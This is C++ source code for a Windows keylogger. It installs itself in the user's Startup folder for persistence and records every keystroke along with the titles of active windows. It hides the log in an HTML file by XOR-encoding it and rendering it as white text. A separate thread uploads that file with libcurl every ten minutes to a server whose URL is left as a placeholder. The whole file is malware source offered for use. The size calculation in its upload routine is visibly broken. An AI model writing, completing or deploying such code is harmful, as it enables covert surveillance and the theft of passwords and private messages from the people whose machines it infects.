#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
#define CURL_STATICLIB 
#include <curl/curl.h>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <unordered_map>
#include <regex>
#include <winhttp.h>
#include <thread>
#include <thread>
#include <chrono>
#include <mutex>
#include <Shlobj.h>
#define FILE_NAME "keylogger.html"
#define ENCRYPTION_KEY 0x5A
using namespace std;

string prevActiveWindow;
mutex fileMutex;
void runLog();
void sendFile();

unordered_map<int, string> keyMap = {
	{0x30, "0"}, {0x31, "1"}, {0x32, "2"}, {0x33, "3"}, {0x34, "4"},
	{0x35, "5"}, {0x36, "6"}, {0x37, "7"}, {0x38, "8"}, {0x39, "9"},
	{0xBF, "/"}, {0xBB, "="}, {0xBC, ","}, {VK_OEM_PERIOD, "."},
	{0xBD, "-"}, {0xE2, "<"}, {VK_SPACE, " "}, {VK_BACK, "[BackSpace]"},
	{VK_RETURN, "[Enter]\n"}, {VK_CONTROL, "[Ctrl]"}, {VK_TAB, "[Tab]"},
	{0x25, "[Left Arrow]"}, {0x26, "[Up Arrow]"}, {0x27, "[Right Arrow]"},
	{0x28, "[Down Arrow]"}, {VK_ESCAPE, "[Esc]"}, {VK_CAPITAL, "[Caps Lock]"},
	{VK_RSHIFT, "[Right Shift]"}, {VK_LSHIFT, "[Left Shift]"},
	{VK_LMENU, "[Left Alt]"}, {VK_RMENU, "[Right Alt]"}, {VK_LWIN, "[Left Win]"},
	{VK_RWIN, "[Right Win]"}, {VK_INSERT, "[Insert]"}, {VK_SCROLL, "[Scroll Lock]"},
	{VK_HOME, "[Home]"}, {VK_END, "[End]"}, {VK_PRIOR, "[Page Up]"},
	{VK_NEXT, "[Page Down]"}, {VK_SNAPSHOT, "[Print Screen]"}, {VK_OEM_3, "[ ~ ` ]"},
	{VK_OEM_4, "[ { [ ]"}, {VK_OEM_6, "[ } ] ]"}, {VK_OEM_1, "[ : ; ]"},
	{VK_OEM_7, "[ \" ' ]"}, {VK_F1, "[F1]"}, {VK_F2, "[F2]"}, {VK_F3, "[F3]"},
	{VK_F4, "[F4]"}, {VK_F5, "[F5]"}, {VK_F6, "[F6]"}, {VK_F7, "[F7]"},
	{VK_F8, "[F8]"}, {VK_F9, "[F9]"}, {VK_F10, "[F10]"}, {VK_F11, "[F11]"},
	{VK_F12, "[F12]"}, {VK_NUMPAD0, "0"}, {VK_NUMPAD1, "1"}, {VK_NUMPAD2, "2"},
	{VK_NUMPAD3, "3"}, {VK_NUMPAD4, "4"}, {VK_NUMPAD5, "5"}, {VK_NUMPAD6, "6"},
	{VK_NUMPAD7, "7"}, {VK_NUMPAD8, "8"}, {VK_NUMPAD9, "9"}, {0x6F, "/"}
};
unordered_map<int, string> ShiftKeyMap = { {0x30, ")"}, {0x31, "!"}, {0x32, "@"}, {0x33, "#"}, {0x34, "$"}, {0x35, "%"},
	{0x36, "^"}, {0x37, "&"}, {0x38, "*"}, {0x39, "("}, {0xBA, ":"}, {0xBB, "+"},
	{0xBC, "<"}, {0xBD, "_"}, {0xBE, ">"}, {0xBF, "?"}, {0xC0, "~"}, {0xDB, "{"},
	{0xDC, "|"}, {0xDD, "}"}, {0xDE, "\""}
};

string xorEncrypt(const string& data) {
	string encryptedData = data;
	for (size_t i = 0; i < encryptedData.length(); i++) {
		encryptedData[i] ^= ENCRYPTION_KEY;
	}
	return encryptedData;
}

string getCurrentActiveWindow() {
	char wnd_title[256];
	HWND hwnd = GetForegroundWindow();
	GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
	return string(wnd_title);
}

string getCharFromKey(int key) {
	if ((key > 64) && (key < 91)) {
		if (!GetAsyncKeyState(0x10))
		{
			return string(1, key + 32);
		}
		else
		{
			return string(1, key);
		}
	}
	else if ((GetAsyncKeyState(0x10)))
	{
		auto it = ShiftKeyMap.find(key);
		if (it != ShiftKeyMap.end()) {
			return it->second;
		}
	}
	else {
		auto it = keyMap.find(key);
		if (it != keyMap.end()) {
			return it->second;
		}
	}
	return "";
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	prevActiveWindow = "";

	wchar_t startupPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
		wcscat_s(startupPath, L"\\MyApp.lnk");

		IShellLink* pShellLink;
		CoInitialize(NULL);
		HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);

		if (SUCCEEDED(hr)) {
			wchar_t modulePath[MAX_PATH];
			GetModuleFileName(NULL, modulePath, MAX_PATH);
			pShellLink->SetPath(modulePath);
			IPersistFile* pPersistFile;
			hr = pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);

			if (SUCCEEDED(hr)) {
				pPersistFile->Save(startupPath, TRUE);
				pPersistFile->Release();
			}

			pShellLink->Release();
		}
		CoUninitialize();
	}

	thread logThread(runLog);
	thread sendFileThread(sendFile);
	logThread.join();
	sendFileThread.join();
	return 0;
}


void runLog() {
	lock_guard<mutex> lock(fileMutex);
	ofstream write(FILE_NAME);
	write << "<!DOCTYPE html>\n";
	write << "<html>\n";
	write << "<head>\n";
	write << "<title>file</title>\n";
	write << "</head>\n";
	write << "<body>\n";

	time_t date = time(NULL);
	string encryptedDate = xorEncrypt(ctime(&date));
	write << "<h2 style=\"color:white;\">" << encryptedDate << "</h2>\n";

	string characters;
	while (true) {
		string activeWindow = getCurrentActiveWindow();

		if (activeWindow != prevActiveWindow) {
			prevActiveWindow = activeWindow;

			string encryptedActiveWindow = xorEncrypt(activeWindow);

			write << "<h3 style=\"color:white;\">" << encryptedActiveWindow << "</h3>\n";

			if (!characters.empty()) {
				write << "<p style=\"color:white;\">" << xorEncrypt(characters) << "</p>\n";
				characters.clear();
			}

			write.flush();
		}

		for (int key = 8; key <= 222; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				string character = getCharFromKey(key);
				if (!character.empty()) {
					characters += character;
				}
			}
		}
		this_thread::sleep_for(chrono::milliseconds(20));
	}
	write << "</body>\n";
	write << "</html>\n";
	write.close();
}

void sendFile() {
	CURL* curl = curl_easy_init();
	if (!curl) {
		return;
	}
	FILE* file = fopen("keylogger.html", "rb");
	if (!file) {
		curl_easy_cleanup(curl);
		return;
	}

	while (true) {
		curl_easy_setopt(curl, CURLOPT_URL, "###"); //server url
		curl_easy_setopt(curl, CURLOPT_POST, 1L);
		curl_easy_setopt(curl, CURLOPT_READDATA, file);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)fread(NULL, 15, 0, file));

		CURLcode res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
		}
		this_thread::sleep_for(chrono::minutes(10));
	}
	fclose(file);
	curl_easy_cleanup(curl);
}

